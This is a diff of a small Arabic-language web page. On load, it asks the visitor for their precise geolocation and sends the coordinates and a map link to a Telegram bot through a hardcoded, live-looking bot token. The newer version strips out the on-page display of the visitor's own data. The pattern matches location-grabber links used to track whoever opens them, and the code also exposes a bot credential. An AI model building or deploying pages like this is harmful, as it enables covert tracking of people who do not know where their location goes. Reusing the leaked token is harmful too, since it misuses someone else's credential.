@@ -1,173 +1,85 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>إرسال الموقع إلى تليجرام</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 20px;
-            padding: 20px;
-        }
-        #status {
-            margin: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            background-color: #f0f0f0;
-        }
-        #locationInfo {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #e8f5e9;
-            border-radius: 5px;
-            display: none;
-        }
-        #mapLink {
-            margin-top: 10px;
-            display: block;
-            color: #1a73e8;
-            text-decoration: none;
-        }
+        body { font-family: Arial; text-align: center; padding: 20px; }
+        #status { padding: 10px; margin: 10px; border-radius: 5px; }
+        .success { background-color: #e8f5e9; }
+        .error { background-color: #ffebee; }
     </style>
 </head>
 <body>
-    <h1>طلب إذن الوصول إلى موقعك الجغرافي</h1>
-    <div id="status">جاري طلب إذن الوصول إلى موقعك...</div>
-    <div id="locationInfo">
-        <h2>معلومات موقعك:</h2>
-        <p><strong>خط العرض:</strong> <span id="latitude"></span></p>
-        <p><strong>خط الطول:</strong> <span id="longitude"></span></p>
-        <p><strong>الدقة:</strong> <span id="accuracy"></span> متر</p>
-        <a id="mapLink" target="_blank">عرض على خرائط جوجل</a>
-    </div>
+    <h2>إرسال الموقع الجغرافي</h2>
+    <div id="status">جاري التحميل...</div>
 
     <script>
         const statusDiv = document.getElementById('status');
-        const locationInfoDiv = document.getElementById('locationInfo');
-        const latitudeSpan = document.getElementById('latitude');
-        const longitudeSpan = document.getElementById('longitude');
-        const accuracySpan = document.getElementById('accuracy');
-        const mapLink = document.getElementById('mapLink');
+        const BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
 
-        // إعدادات بوت تليجرام
-        const TELEGRAM_BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
-        const CHAT_ID = ''; // اتركه فارغاً للإرسال إلى دردشة البوت
-
-        // طلب إذن الموقع عند تحميل الصفحة
-        window.addEventListener('DOMContentLoaded', () => {
-            requestLocationPermission();
-        });
-
-        function requestLocationPermission() {
+        // طلب الموقع عند تحميل الصفحة
+        window.onload = () => {
             if (!navigator.geolocation) {
-                statusDiv.textContent = 'متصفحك لا يدعم خدمة الموقع الجغرافي';
-                statusDiv.style.backgroundColor = '#ffebee';
+                showError("المتصفح لا يدعم خدمة الموقع");
                 return;
             }
-
-            statusDiv.textContent = 'جاري طلب إذن الوصول إلى موقعك...';
             
+            statusDiv.textContent = "جاري طلب الإذن...";
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    // عند منح الإذن بنجاح
-                    const locationData = showLocation(position);
-                    statusDiv.textContent = 'جاري إرسال الموقع إلى تليجرام...';
-                    await sendToTelegram(locationData);
-                },
-                (error) => {
-                    // عند رفض الإذن أو حدوث خطأ
-                    handleLocationError(error);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                sendLocationToTelegram,
+                (err) => showError(getErrorMsg(err)),
+                { enableHighAccuracy: true, timeout: 10000 }
             );
-        }
+        };
 
-        function showLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            
-            latitudeSpan.textContent = latitude;
-            longitudeSpan.textContent = longitude;
-            accuracySpan.textContent = accuracy;
-            
-            // إنشاء رابط خرائط جوجل
-            mapLink.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            mapLink.textContent = `عرض الموقع على خرائط جوجل (دقة: ${accuracy} متر)`;
-            
-            locationInfoDiv.style.display = 'block';
-            
-            return {
-                latitude,
-                longitude,
-                accuracy,
-                timestamp: new Date(position.timestamp).toLocaleString()
-            };
-        }
-
-        async function sendToTelegram(locationData) {
+        // إرسال الموقع إلى تليجرام
+        async function sendLocationToTelegram(position) {
             try {
-                const message = `📍 تم استلام موقع جديد:
-- خط العرض: ${locationData.latitude}
-- خط الطول: ${locationData.longitude}
-- الدقة: ${locationData.accuracy} متر
-- الوقت: ${locationData.timestamp}
-- الرابط: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-
+                statusDiv.textContent = "جاري الإرسال...";
+                
+                const { latitude, longitude } = position.coords;
+                const mapUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
+                const message = `📍 موقع جديد:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- الرابط: ${mapUrl}`;
+                
                 const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                     {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            disable_web_page_preview: false
+                            chat_id: "", // اتركه فارغاً للإرسال إلى دردشة البوت
+                            text: message
                         })
                     }
                 );
-
-                const result = await response.json();
                 
-                if (result.ok) {
-                    statusDiv.textContent = 'تم إرسال موقعك إلى بوت تليجرام بنجاح!';
-                    statusDiv.style.backgroundColor = '#e8f5e9';
+                const data = await response.json();
+                if (data.ok) {
+                    statusDiv.textContent = "✅ تم الإرسال بنجاح إلى تليجرام!";
+                    statusDiv.className = "success";
                 } else {
-                    throw new Error(result.description || 'خطأ غير معروف من تليجرام');
+                    throw new Error(data.description || "فشل الإرسال");
                 }
             } catch (error) {
-                console.error('خطأ في الإرسال:', error);
-                statusDiv.textContent = `فشل الإرسال: ${error.message}`;
-                statusDiv.style.backgroundColor = '#ffebee';
+                showError(`خطأ: ${error.message}`);
+                console.error("Error:", error);
             }
         }
 
-        function handleLocationError(error) {
-            let message = '';
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    message = 'تم رفض إذن الوصول إلى الموقع. يرجى منح الإذن لمشاركة موقعك.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = 'معلومات الموقع غير متاحة حالياً.';
-                    break;
-                case error.TIMEOUT:
-                    message = 'انتهى وقت طلب الموقع. يرجى المحاولة مرة أخرى.';
-                    break;
-                case error.UNKNOWN_ERROR:
-                    message = 'حدث خطأ غير معروف أثناء محاولة تحديد الموقع.';
-                    break;
+        // معالجة الأخطاء
+        function getErrorMsg(err) {
+            switch(err.code) {
+                case 1: return "تم رفض الإذن ❌";
+                case 2: return "الموقع غير متاح 🌐";
+                case 3: return "انتهى الوقت ⏳";
+                default: return "خطأ غير معروف";
             }
-            statusDiv.textContent = message;
-            statusDiv.style.backgroundColor = '#ffebee';
+        }
+
+        function showError(msg) {
+            statusDiv.textContent = msg;
+            statusDiv.className = "error";
         }
     </script>
 </body>
